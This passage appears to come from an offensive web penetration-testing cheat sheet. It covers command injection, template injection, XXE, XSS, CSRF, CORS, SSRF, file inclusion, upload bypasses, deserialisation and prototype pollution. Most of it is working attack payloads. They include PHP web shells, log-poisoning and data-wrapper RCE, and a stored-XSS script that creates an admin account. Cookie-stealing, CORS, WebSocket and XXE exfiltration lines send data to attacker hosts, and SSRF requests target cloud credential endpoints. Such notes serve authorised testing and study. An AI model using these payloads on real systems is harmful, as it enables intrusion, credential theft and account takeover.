echo aWQ=|base64 -d|sh          # nothing recognisable at all
```

A newline (`%0a`) separates commands as well as `;` does, and filters forget it.

JavaScript:

```javascript
alert`1`                                   // call without parentheses
eval(atob('YWxlcnQoMSk='))                 // nothing recognisable
String.fromCharCode(97,108,101,114,116)    // a string without quotes
```

PHP, when function names are blacklisted:

```php
("sys"."tem")("id");
$f = "sys"."tem"; $f("id");
```

---

## SSTI

If a name field comes back as something other than what you typed, or an error mentions Jinja / Twig / Freemarker / Velocity / Thymeleaf / ERB, you are in template land.

Identify:

```
{{7*7}}          → 49     Jinja2, Twig, Nunjucks
{{7*'7'}}        → 49 Twig, 7777777 Jinja2
${7*7}           →        Freemarker, Pebble, Java EL
<%= 7*7 %>       →        ERB
#{7*7}           →        Ruby, some Java
*{7*7}           →        Thymeleaf
{{constructor}}  →        Angular (that is CSTI, next section)
```

Jinja2 RCE (Flask):

```
{{config.items()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

`lipsum`, `cycler`, `joiner` and `namespace` exist in every Jinja2 environment, Flask or not. `request` and `config` are Flask only.

No handy global? Walk the class tree and pick `Popen` by name, not by index (the index moves between Python versions):

```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c('id',shell=True,stdout=-1).communicate()[0] }}{% endif %}{% endfor %}
```

Filtered characters:

```
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}      no dots
{{lipsum['__globals__']['os']['popen']('id')['read']()}}                                         no dots
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}   no underscores
{%print(lipsum.__globals__.os.popen('id').read())%}                                              no {{ }}
```

All of the Jinja2 lines above ran on Jinja2 3.1.6. A `SandboxedEnvironment` blocks them (`SecurityError`); then you need a sandbox escape for that exact version, not a longer payload.

Freemarker:

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

ERB:

```
<%= system('id') %>
<%= File.read('/etc/passwd') %>
```

Twig (older):

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Twig 2 and 3 (`_self.env` is gone), plus the usual Java and Node engines. None of these were run for this note; check them against the engine version you face:

```
{{['id']|filter('system')}}                                         Twig 2/3
${T(java.lang.Runtime).getRuntime().exec('id')}                     Spring EL
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x             Thymeleaf, in a view name or fragment
#set($x='')$x.class.forName('java.lang.Runtime').getRuntime().exec('id')     Velocity
<%= process.mainModule.require('child_process').execSync('id') %>   EJS
#{process.mainModule.require('child_process').execSync('id')}       Pug
```

With source, do not fingerprint: look at the imports and the render call. The bug is always the same line, a template *string* built from input (`render_template_string(x)`, `new Template(x)`, `Twig\Environment::createTemplate($x)`, `ejs.render(x)`). A fixed template file with your value passed in as data is not SSTI. `SSTImap` automates the black-box part.

If it renders `{{7*7}}` as `49` in an *email* or a *PDF*, that is still RCE, just second-order. Registration name fields are a favourite.

### SSI / ESI

Same family, older parsers.

SSI (`.shtml`, Apache `Includes`):

```
<!--#exec cmd="id" -->
<!--#include virtual="/.env" -->
<!--#include file="../../../../etc/passwd" -->
```

ESI (Akamai, Varnish, some CDNs — look for `Surrogate-Control: content="ESI/1.0"`):

```
<esi:include src="http://attacker.example/" />
<esi:include src="http://127.0.0.1/admin" />
```

That is XSS or SSRF, depending on whether the fragment is reflected or fetched.

Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

---

## CSTI

Same idea, in the browser. The template engine is AngularJS / Vue / Mavo / etc. CSP often blocks classic XSS but still evaluates `{{ }}`.

AngularJS (old, no sandbox):

```
{{constructor.constructor('print()')()}}
{{$new.constructor('print()')()}}
```

AngularJS with sandbox, one of the known escapes (version-specific — look it up, do not spray 30):

```
{{x={'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=print()')}}
```

Vue (when using the attacker-controlled string as a template, not as text):

```
{{constructor.constructor('print()')()}}
```

You need the payload in a place the client-side engine compiles, not just in innerHTML. Read the JS.

---

## XXE

XML parser loads your DTD and you tell it to fetch a file or a URL. Any upload, SOAP, SAML, Office file (`xlsx`/`docx` are zip+XML), RSS, XML sitemap, `Content-Type: application/xml`.

Detect with a harmless entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY xxe "gotcha">]>
<user><firstName>John</firstName><lastName>&xxe;</lastName></user>
```

If the page says `gotcha`, expand:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Windows: `file:///C:/Windows/win.ini`.

Blind / out of band (Collaborator):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-COLLAB/x.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

And `x.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://YOUR-COLLAB/?x=%file;'>">
%eval;
```

Parameter entities (`%`) when named entities are blocked. `php://filter/convert.base64-encode/resource=/etc/passwd` when the file has XML-breaking characters.

No outbound connection, but parser errors are shown? Put the file content into a path that cannot exist, and read it out of the error. Hosted DTD version (from the PortSwigger material, not run here):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Cannot host a DTD either? Redefine an entity of a DTD that already exists on the server (`/usr/share/yelp/dtd/docbookx.dtd` and friends); the trick and a list of usable local DTDs are in PayloadsAllTheThings.

Limits worth knowing before you burn an hour:

- The out-of-band URL trick breaks on the first newline in most parsers. `/etc/hostname` works, `/etc/passwd` usually does not. Use error-based, or `php://filter` base64 on PHP.
- Java: `file:///etc/` on a directory returns a listing. Old Java versions also allowed multi-line exfiltration over `ftp://`.
- In a white-box test, the question is how the parser is configured: `LIBXML_NOENT` or `LIBXML_DTDLOAD` in PHP, a `DocumentBuilderFactory` without `disallow-doctype-decl` in Java, `XmlResolver` not null or `DtdProcessing.Parse` in .NET.

SVG / SOAP / docx: unzip, infect `[Content_Types].xml` or a `.rels` file, rezip.

Do not forget XInclude:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## XSLT

If the app applies an XSL stylesheet to XML (export, RSS, "pretty print", upload-a-template), you can often execute functions.

Attach a stylesheet:

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.example/evil.xsl"?>
<foo/>
```

`evil.xsl` (PHP `php:function` — only if the PHP XSL extension is happy to call into PHP):

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

Java (Saxon / Xalan) can reach `rt:exec`. Look up the engine; the probe is "does my XSL run at all".

---

## XPath / LDAP / CRLF

### XPath

Login or search against an XML user store.

```
' or '1'='1
' or 1=1 or 'a'='a
admin' or 'a'='a
```

Extract: `' or substring(name,1,1)='a` and so on. Same rhythm as blind SQLi.

### LDAP

```
*
*)(&
*)(uid=*))(|(uid=*
admin)(!(&(1=0
```

`*` as a password sometimes binds. Wildcard in a search filter dumps the directory.

### CRLF / header injection

You need `%0d%0a` in something that is copied into a response header (redirect, cookie, file download filename).

```
%0d%0aSet-Cookie:session=stolen
%0d%0aLocation:https://attacker.example
%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a...
```

That last one is response splitting → XSS / cache poison. HTTP/1 only.

---

## XSS

Canary first. Submit something you can grep:

```
xpyxpy " ' < > ;
```

Search the response (and later pages, and emails, and PDFs) for `xpyxpy`. The characters that survived tell you the context: HTML body, attribute, JS string, URL, template.

`alert()` is noisy and often blocked. Use `print()` or `prompt(document.domain)`. https://portswigger.net/research/alert-is-dead-long-live-print

Cheat sheet of vectors: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

```
<script>print(document.cookie)</script>
<script>print(window.location.host)</script>
<img src=x onerror=print()>
<svg onload=print()>
"><img src=x onerror=print()>
'-print()-'
</script><script>print()</script>
```

HttpOnly cookies will not show up in `document.cookie`. You can still drive the session (CSRF-ish actions, extract CSRF tokens, hook BeEF). Stealing the cookie is optional.

BeEF hook, when you want a browser:

```
<script src="http://10.10.10.10:3000/hook.js"></script>
```

### Reflected

The payload comes back in *this* response. Send the victim a link. Shorten, wrap in a login open-redirect, or put it in a `postMessage` if the query string is filtered.

WAF: case (`<ScRiPt>`), encoding (`%3cscript%3e`), double encoding, `srcdoc`, `svg/onload`, breaking out of the exact context you are in. Context beats lists.

The same `<img src=1 onerror=alert()>`, written so a naive filter misses it. Combine them:

```
<img src=1 oNeRRoR=alert()>                                       case
<img src=1 onerror=alert``>                                       no parentheses
<img src=x onerror="&#x61;lert(1)">                               HTML entity inside the attribute
<a href="javascript&#00000000000058;alert(1)">x</a>               entity with leading zeros
<img src=1 onerror=alert()>              JS unicode escapes
%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%29%3e
```

### Stored

Payload sits in the DB and hits every visitor of that page. Admin panels, support tickets, display names, file names, logs, markdown profiles. One payload, many victims. Check the admin app on a different host — cookie `Domain=.victim.example` may still send.

Blind: the page that renders your payload is one you cannot see (back office, log viewer, PDF export). Use a payload that loads a script from your server, so the hit itself tells you where it fired:

```
"><script src=https://attacker.example/x.js></script>
```

### Stored XSS to admin action

A stored XSS in front of an admin is an authentication bypass. Do not steal the cookie (it is `HttpOnly` anyway). Make the admin's browser do the admin's work:

1. Fetch a page that contains a CSRF token, with the admin's session.
2. Pull the token out of the HTML.
3. Send the privileged request: create an admin user, change an e-mail, enable a plugin, upload a file.
4. Report back to your server so the script knows it happened.

```javascript
(async () => {
  const page = await (await fetch('/admin/users/new', {credentials: 'include'})).text();
  const token = (page.match(/name="csrf_token"\s+value="([^"]+)"/) || [])[1];
  await fetch('/admin/users', {method: 'POST', credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: new URLSearchParams({csrf_token: token, username: 'pwn', password: 'Pwn12345!', role: 'admin'})});
  fetch('https://attacker.example/done', {mode: 'no-cors'});
})();
```

Same origin, so no CORS problem and the anti-CSRF token protects nothing. The full version, with the server that hosts it and waits for the callback, is in [[Exploit skeleton (Python)]].

Short field? Store only `<script src=//attacker.example/x.js></script>` and keep the logic on your side.

### DOM XSS

The server never sees the payload. JS reads a source and writes it to a sink.

Order: find the sink, then the source, then a URL that connects them.

Sources: `location`, `location.hash`, `location.search`, `document.referrer`, `postMessage`, `sessionStorage`, cookie.

Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `location=`, jQuery `$()` on HTML, `insertAdjacentHTML`.

Example: a hashchange handler that dumps the hash into a jQuery selector / HTML:

```javascript
$(window).on('hashchange', function () {
  var post = $('section.blog-list h2:contains(' + decodeURIComponent(location.hash.slice(1)) + ')');
  if (post) post.get(0).scrollIntoView();
});
```

The source is the hash. `$()` will parse HTML if you feed it a tag:

```html
<iframe src="https://victim.example/#" onload="this.src+='<img src=x onerror=print()>'" hidden></iframe>
```

Victim opens your page → iframe loads the app → `onload` appends the payload to the hash → `hashchange` fires → sink.

In DevTools Debugger, Ctrl+F for `<script`, then for `innerHTML` / `hash` / `eval`. That is the whole method.

`postMessage` is a source people forget. Search for `addEventListener('message'` and check whether the handler tests `event.origin`. If it does not, any page that frames or opens the app can feed it:

```html
<iframe src="https://victim.example/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')"></iframe>
```

Burp's DOM Invader (in the embedded browser) finds sources, sinks and message handlers faster than reading minified code.

### HTML injection, no JS

If script is blocked (CSP, sanitizer) but markup lives, you still get:

```
<iframe src="https://attacker.example"></iframe>
<a href="https://attacker.example">reset your password</a>
<form action="https://attacker.example">...
```

Useful in emails and PDFs. PDF HTML is often SSRF/LFI through the renderer (`<iframe src="file:///etc/passwd">`, `<img src="http://169.254.169.254/">`).

---

## CSRF

The victim's browser already has the cookie. You need them to hit a state-changing URL on the victim origin. Templates: [[CSRF templates]].

Checklist for a request:

1. Cookie-based auth (not a `Authorization: Bearer` header the browser will not attach for you).
2. No, or guessable, anti-CSRF token. Token in a cookie that is just echoed (double-submit) without binding is weak.
3. No `SameSite=Strict`. `Lax` still sends cookies on top-level GET navigations (so GET CSRF lives). `None` needs `Secure`.
4. Content type you can produce from a form (`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`). `application/json` from a simple form is not JSON — unless the server is sloppy.

GET:

```html
<img src="https://victim.example/account/email/confirm?email=attacker@x">
<meta http-equiv="refresh" content="0; url=https://victim.example/admin/delete?id=1">
```

POST: see [[CSRF templates]]. Hidden auto-submit form.

JSON-ish with `text/plain` (no preflight):

```html
<form method="POST" action="https://victim.example/api/email" enctype="text/plain">
  <input name='{"email":"attacker@x","x":"' value='"}'>
</form>
```

Bypasses worth trying: drop the token, empty token, token from another account, token in the cookie only, switch POST → GET, switch JSON → form, method override `_method=PUT`. File uploads are forgeable too: a `multipart/form-data` form POST needs no CORS preflight.

Login CSRF is a thing: force the victim into *your* account, wait for them to attach a credit card / OAuth.

---

## Clickjacking

The app can be framed, and one click inside the frame does something that matters (delete, approve, change e-mail, grant OAuth consent).

Check the response headers: no `X-Frame-Options` and no `frame-ancestors` in the CSP means it frames. Then prove it with a page that puts the invisible app over a decoy button. Template: [[CSRF templates]].

Only worth reporting with a real one-click action behind it. "The login page can be framed" is a hardening note.

---

## CORS

CORS is the browser asking the server "may this other origin read the response?". It is not CSRF. CSRF *sends* the victim's cookies; CORS misconfig lets *your JS* *read* the victim's data.

Finding: from a random origin, does the API reflect it and allow credentials?

```
GET /api/me HTTP/1.1
Host: victim.example
Origin: https://attacker.example
Cookie: session=...
```

Bad:

```
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true
```

Also bad: reflection of `Origin: https://victim.example.attacker.example`, `null` (sandboxed iframe), or any origin plus credentials. `ACAO: *` with credentials is ignored by browsers — not a finding by itself.

PoC:

```html
<script>
fetch('https://victim.example/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => location = 'https://attacker.example/log?d=' + encodeURIComponent(t));
</script>
```

`XMLHttpRequest` with `withCredentials = true` is the same thing. You need the victim to visit your page while logged into the app.

---

## Open redirect

`next`, `return`, `url`, `redirect`, `r`, `dest`, `continue`, `goto`. After login, after logout, in SSO, in password reset.

```
/?next=https://attacker.example
/?next=//attacker.example
/?next=\/\/attacker.example
/?next=https:attacker.example
/?next=/\/attacker.example
/?next=https://victim.example.attacker.example
/?next=https://attacker.example%23.victim.example
/?next=https://attacker.example%00.victim.example
```

Chain it: OAuth `redirect_uri` via an allowed internal redirect, or XSS filter that allows `/` but not `https://`.

---

## Path traversal, LFI, RFI

`../` until you leave the intended directory. Download endpoints, template names, image resizers, log viewers, `?page=about`.

```
/../../../../etc/passwd
/..%2f..%2f..%2fetc/passwd
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/....//....//etc/passwd
/..;/..;/etc/passwd
```

If a proxy normalises before the app, try:

```bash
curl --path-as-is 'https://victim.example/public/plugins/alertlist/../../../../../../etc/passwd'
```

Windows: `..\..\..\windows\win.ini`. Null byte `%00` only on ancient PHP.

**Traversal reads. LFI includes.** In PHP, `include($_GET['page'])` will *execute* PHP in the included file and print everything else. That is why log poisoning works.

Wrappers when filters block `../`:

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../app/config.php
php://input          (POST body is PHP)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=
expect://id
zip://upload.zip#shell.php
phar://upload.phar
```

```bash
curl 'https://victim.example/index.php?page=php://filter/convert.base64-encode/resource=config.php'
echo "$b64" | base64 -d
```

RCE via data wrapper:

```bash
echo -n '<?php system($_GET["cmd"]);?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=
curl 'https://victim.example/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=&cmd=id'
```

### Log poisoning

1. Get PHP into a log the web user can include. User-Agent is the usual:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

or a 404 URL: `/<?php system($_GET['cmd']); ?>`.

2. Include the log:

```
/menu.php?file=../../../../var/log/apache2/access.log&cmd=id
/menu.php?file=../../../../var/log/nginx/access.log&cmd=id
/menu.php?file=../../../../var/log/auth.log&cmd=id
/menu.php?file=/proc/self/environ&cmd=id
```

URL-encode the reverse shell once you have `id`.

### RFI

`allow_url_include=On` (rare now). Host the payload, include it:

```
/menu.php?file=http://10.10.10.10/evil.txt
/menu.php?file=http://10.10.10.10/evil.txt?
/menu.php?file=http://10.10.10.10/evil.txt%00
```

`evil.txt`:

```php
<?php system($_GET['cmd']); ?>
```

---

## File upload

You want: stored XSS, or a file the server will execute, or a file a parser will choke on (XXE, ImageMagick).

Path: upload, then find the URL (response JSON, timestamped `/uploads/`, brute the name). If you cannot execute, try overwriting something with traversal in the filename:

```
filename="../../../../var/www/html/shell.php"
filename="..\\..\\inetpub\\wwwroot\\shell.php"
```

Extension bypass:

```
shell.php.jpg
shell.php%00.jpg
shell.phtml shell.php5 shell.php.jpeg
shell.PHP
shell.php.
shell.php::$DATA          (NTFS)
shell.asp;.jpg
```

Content-Type: `image/jpeg` with PHP inside. Magic bytes: `GIF89a;<?php system($_GET['c']); ?>`. Polyglot PDF/PHP, JPEG/JS.

How the filter usually fails (PHP behaviour checked on 7.4 and 8.3):

- It takes the **last** extension (`pathinfo()` gives `jpg` for `shell.php.jpg`) while Apache with a loose handler config executes on **any** `.php` in the name.
- It compares case-sensitively: `in_array('pHp', ['php'])` is false, so a blacklist lets `shell.pHp` through.
- Its regex ends in `$`: `/\.(jpg|png)$/` accepts `shell.jpg%0a`.
- It trusts `Content-Type` or the first bytes, both of which you set.
- It checks the name and then saves under a name built from something else you control.

Config files instead of code, when you can write into a served directory:

`.htaccess` (Apache, if `AllowOverride` permits):

```
AddType application/x-httpd-php .jpg
```

`.user.ini` (PHP under FPM or CGI; picked up after a cache delay, five minutes by default). Not run here:

```
auto_prepend_file=shell.jpg
```

`web.config` (IIS) can map a handler or run code from inside the config file itself; payloads are in PayloadsAllTheThings.

Archives. An upload feature that unpacks a zip or tar (themes, plugins, imports, backups) rarely checks the names inside:

```
../../../../var/www/html/shell.php          entry name with traversal ("zip slip")
link -> /etc/passwd                          symlink entry, then download "link"
```

Build both with the `evil_zip` helper in [[Exploit skeleton (Python)]]. Python's `zipfile` keeps the names exactly as given.

What to overwrite when you can write anywhere but not execute directly:

```
~/.ssh/authorized_keys          your public key, then ssh in
a template or view file         rendered on the next request
webapps/ROOT/x.jsp              Tomcat picks it up
a cron file or a script that a scheduled job runs
```

Race: some apps save the file, check it, then delete it. Request it in a loop while you upload.

SVG → XSS:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="print()">
```

SVG → LFI / SSRF in an image converter:

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="file:///etc/passwd"/>
</svg>
```

EICAR is only to see if an AV sits in the way. Not a finding.

---

## SSRF

The server fetches a URL you give it. Screenshotters, PDF renderers, webhooks, importers, "fetch this image", OpenGraph previews, Slack unfurls.

Probe:

```
http://127.0.0.1/
http://127.0.0.1:22
http://localhost/server-status
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://127.1/
http://0177.0.0.1/
http://2130706433/          decimal 127.0.0.1
http://0/
```

Cloud:

```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2: a PUT with a header first, then the token on every GET.
# A GET-only SSRF cannot do this; you need control of method and headers (or code execution).
PUT http://169.254.169.254/latest/api/token
#   header: X-aws-ec2-metadata-token-ttl-seconds: 21600
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
#   header: X-aws-ec2-metadata-token: <token>

# AWS ECS / Fargate: the path is in the container's environment (AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
http://169.254.170.2/v2/credentials/<guid>

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# header: Metadata: true
```

What to do with the credentials: [[AWS Offensive Field Guide]].

Bypasses when `http://127.0.0.1` is blocked: redirect from a host you own, DNS rebinding (short TTL that flips from a public IP to `127.0.0.1`), decimal/octal/IPv6, a name that resolves to loopback (`127.0.0.1.nip.io`), `file://`, `gopher://`, `dict://`, `smb://`.

The validator and the HTTP client often parse the same URL differently. Aim for the gap:

```
http://victim.example@attacker.example/          userinfo: the host is attacker.example
http://attacker.example#@victim.example/         fragment
http://attacker.example\@victim.example/         backslash, parsers disagree
http://victim.example.attacker.example/          suffix check
http://attacker.example/?x=victim.example        "contains" check
```

Blind: Collaborator DNS is enough to prove it. Then use the SSRF itself to reach internal hosts (`admin.internal`, `redis:6379`, `http://169.254.169.254/`): status codes, response times and error text tell open from closed. `gopher://` still talks to Redis/Memcached/SMTP on some stacks, because it lets you write raw bytes:

```
gopher://127.0.0.1:6379/_SET%20x%20y%0D%0A
```

In a microservice setup the prize is usually an internal API that trusts everything on its network: an admin port of the gateway, a job runner, a config service. Enumerate hosts and ports through the SSRF, then read that service's API docs.

HTML in a PDF renderer is SSRF with extra steps: `<iframe src="http://127.0.0.1:6379">`.

A renderer that is a headless browser runs your JavaScript inside the network. That is better than SSRF: a script can scan, read same-origin responses and send them out.

```html
<script>
fetch('http://127.0.0.1:8001/').then(r => r.text())
  .then(t => fetch('https://attacker.example/x', {method: 'POST', mode: 'no-cors', body: t}));
</script>
```

Cross-origin responses are still opaque to the script, so point it at what the page's own origin can read, or use it as a blind port scanner.

---

## API and GraphQL

Find the API before you fuzz it. JS, mobile APK (`apktool d`, grep `api.`), `/swagger`, `/openapi.json`, `/graphql`, `/api/v1`.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://victim.example/FUZZ/v1 -mc 200,401,403

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://victim.example/api/v1/FUZZ -mc 200,401,403
```

Gobuster with a pattern file:

```
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/graphql
```

Verbs:

```bash
ffuf -w methods.txt -u https://victim.example/api/v1/user/1 -X FUZZ \
  -H 'Authorization: Bearer eyJ...' -H 'Content-Type: application/json' \
  -d '{"name":"x"}' -mc 200,204,401,403,405
```

`methods.txt`: `GET POST PUT PATCH DELETE OPTIONS HEAD TRACE`.

A 403 on GET and a 200 on PUT is a finding, not a curiosity. Try `/user/1` vs `/User/1` vs `/user/1/` vs `/user/1.json` vs `/user?id=1`.

JSON quirks:

```
{"user":"admin"}
{"user": ["admin"]}
{"user": true}
{"id":1, "id":2}                 duplicate keys, parser roulette
{"__proto__": {"admin": true}}   prototype pollution
```

SOAP is XML — [XXE](#xxe) plus verb tampering.

### GraphQL

```
POST /graphql
{"query":"{__typename}"}
```

Introspection (often left on):

```json
{"query":"{__schema{types{name fields{name args{name} type{name}}}}}"}
```

or open the endpoint in GraphQL Playground / InQL.

Then:

- IDOR on `user(id:)` / `node(id:)` — walk ints.
- Batch / aliases to skip rate limits:

```
query {
  a1: login(user:"admin", pass:"a") { token }
  a2: login(user:"admin", pass:"b") { token }
}
```

- Nested queries that explode the DB (`user { friends { friends { friends { name }}}}`). DoS — ask before you prove it on prod.
- Mutations that the UI never exposes (`updateUserRole`).
- Auth on the HTTP layer but not per-field.

---

## WebSockets

A WebSocket is one HTTP handshake followed by messages in both directions. Scanners and most testers stop at the handshake, so the messages are where the untested input is.

Find it: Burp → Proxy → WebSockets history. Send a message to Repeater and edit it like any request. In the JS, search for `new WebSocket(`, `io(` (Socket.IO), `SockJS`.

From the terminal:

```bash
websocat -H 'Cookie: session=...' wss://victim.example/ws
```

What to test:

- **Every field of every message is a parameter.** Same payloads as over HTTP: SQL injection, command injection, XSS when messages are rendered to other users, IDOR on any id in the frame.
- **Authorisation only at the handshake.** The socket was opened as a user; does each message check what that user may do? Send an admin-only message type from a normal session.
- **Message types the UI never sends.** They are listed in the client JS.
- **No `Origin` check and cookie authentication** is cross-site WebSocket hijacking: your page opens the socket with the victim's cookies and reads the replies. CSRF, but with a response.

```html
<script>
const ws = new WebSocket('wss://victim.example/ws');
ws.onopen = () => ws.send('{"action":"history"}');
ws.onmessage = e => fetch('https://attacker.example/x', {method: 'POST', mode: 'no-cors', body: e.data});
</script>
```

Command injection through a message looks exactly like the HTTP version. Usually it is blind, so use a delay or a callback:

```
{"action":"ping","host":"127.0.0.1; sleep 5"}
{"action":"ping","host":"127.0.0.1; curl http://10.10.10.10:8000/$(id|base64 -w0)"}
```

Socket.IO wraps messages in its own framing. On the wire a client event is `42["eventName",{...}]`, `40` opens the namespace, and `2`/`3` are ping and pong. Send the frame in that shape or the server ignores it. (Framing as documented; not run here.)

A scriptable client is in [[Exploit skeleton (Python)]]; it was run against a test server with exactly this kind of injection.

---

## Cookies and sessions

```
Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax; Path=/; Domain=.victim.example
```

- Missing `Secure` on an HTTPS app: cookie rides HTTP if you can force it.
- Missing `HttpOnly`: XSS can read it.
- `Domain=.victim.example`: every subdomain gets it. XSS on `help.victim.example` steals the app session.
- `SameSite=None` or missing on a Chrome that still sends it: CSRF.
- `Path=/admin` is not a security boundary.

If the value is not random, decode it (base64, hex, JWT, serialized PHP `O:`, Flask session, ASP.NET ViewState). Flask: `flask-unsign`. PHP: `unserialize` → [Deserialisation](#deserialisation-and-viewstate).

Session fixation: set `session=aabb` on `/`, log in, see if `aabb` is now authenticated.

Logout: replay the old cookie. JWT will usually still work until `exp`. That is worth writing up when the token is long-lived and in localStorage.

Cookie stealer when HttpOnly is off and you have XSS:

```html
<script>new Image().src="https://attacker.example/c?c="+encodeURIComponent(document.cookie)</script>
```

---

## Deserialisation and ViewState

The server turns a blob you hold back into objects. If you can pick the class, you can often pick `Runtime.exec`.

Signs: cookie starting `O:` (PHP), `rO0` / `aced` (Java), `pickle` / `gASV` (Python), `.NET` ViewState `__VIEWSTATE=`, Node `{"rce":"_$$ND_FUNC$$_..."}`, Ruby `Marshal`.

.NET has more than ViewState: base64 starting `AAEAAAD/////` is BinaryFormatter, `/wE` is LosFormatter, JSON with `"$type"` is Json.NET with type names on. Gadgets, ysoserial.net usage and the white-box grep are in [[Deserialization (.NET)]].

Other places the same bug hides:

- PHP `phar://` in any file function (`file_exists`, `fopen`, `getimagesize`) deserialises the archive's metadata, up to PHP 7.4. PHP 8 stopped doing that automatically.
- YAML: `yaml.load(x)` without a safe loader in Python, `new Yaml().load(x)` in Java (SnakeYAML before 2.0).
- Java beyond `ObjectInputStream`: `XMLDecoder`, XStream, Jackson with default typing.

PHP (phpggc):

```bash
phpggc Laravel/RCE8 system 'id' -b
# put the gadget in the cookie / POST body the app unserializes
```

Java (ysoserial):

```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR-COLLAB' | base64 -w0
java -jar ysoserial.jar URLDNS 'http://YOUR-COLLAB' | base64 -w0       # safe probe: only a DNS lookup, needs no library
```

Python pickle — do not paste a gadget into a client's prod until you know it is pickle. The probe is a Collaborator DNS from `__reduce__`.

Node `node-serialize`:

```json
{"run":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

ViewState: if MAC is off, `ysoserial.net`. If MAC is on, you need `machineKey` (often in `web.config`, aspnet leak, or Blacklist3r on a weak key). ViewState without MAC is the finding; RCE is the encore.

---

## Prototype pollution

JavaScript only. A recursive merge copies your `__proto__` key into `Object.prototype`, and from then on every object in the process (or the page) has the property you planted.

Server-side, in a JSON body:

```json
{"__proto__":{"isAdmin":true}}
```

Detect it without source and without breaking the app:

```json
{"__proto__":{"status":510}}
```

If errors that used to be 500 now come back as 510, the prototype is polluted (run on Express 4.22). The pollution is global and stays until the process restarts, so probe with harmless names and never with `toString` or `constructor`.

From there: flip a flag that code reads from a plain object, or reach a gadget. On Node 20 and 22 a polluted `NODE_OPTIONS` gives code execution as soon as the app starts a Node child process. Payloads, the tested gadget table and the white-box grep are in [[Prototype Pollution]].

Client-side it is a DOM XSS primitive:

```
https://victim.example/?__proto__[polluted]=1
https://victim.example/#__proto__[polluted]=1
https://victim.example/?constructor[prototype][polluted]=1
```

Then `Object.prototype.polluted` in the console. You still need a script on the page that reads an unset option into a sink; DOM Invader finds those.

---

## Encryption

You see `cookie=base64(iv||ct)` or `data.sig`. Do not start with cryptopals. Do this:

1. Decode. Block size 16 → AES, 8 → DES/3DES. Repeating blocks → ECB.
2. ECB cut-and-paste: duplicate a block that says `role=user` and swap in a block you obtained for `role=admin` (register a user named `aaaaaaaaaaadmin` etc.).
3. CBC bit-flip: flip a byte in block n-1 to change plaintext block n. Good for `role=user` → `role=admin` when you know the layout.
